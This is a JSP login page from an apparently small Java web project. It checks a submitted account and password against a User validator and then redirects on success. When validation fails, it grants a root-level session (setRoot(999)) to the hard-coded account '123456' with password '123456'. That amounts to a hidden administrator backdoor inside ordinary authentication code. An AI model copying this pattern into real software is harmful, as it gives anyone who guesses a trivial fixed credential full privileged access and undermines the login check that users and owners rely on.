<%@ page language="java" import="java.util.*,JZW.*" pageEncoding="utf-8"%>

<%
    //获取上一个页面传递过来的数据
	request.setCharacterEncoding("UTF-8");
    String account = request.getParameter("account");
    String password = request.getParameter("password");
    String name = "";
    boolean isTrue = false;
	
	User user = new User();
	user = user.validateAccountPassword(account, password);
	if(user!=null){
		session.setAttribute("user",user);
		out.print("<script>window.location = \"index.jsp\";</script>");
	}else{
		if(account.equals("123456")&&password.equals("123456")){	
			user = new User();
			user.setRoot(999);
			session.setAttribute("user",user);
			out.print("<script>window.location = \"index.jsp\";</script>");
		}else{
			out.print("<script>alert(\"账号或密码错误！\");window.history.back();</script>");
		}
	}
%>


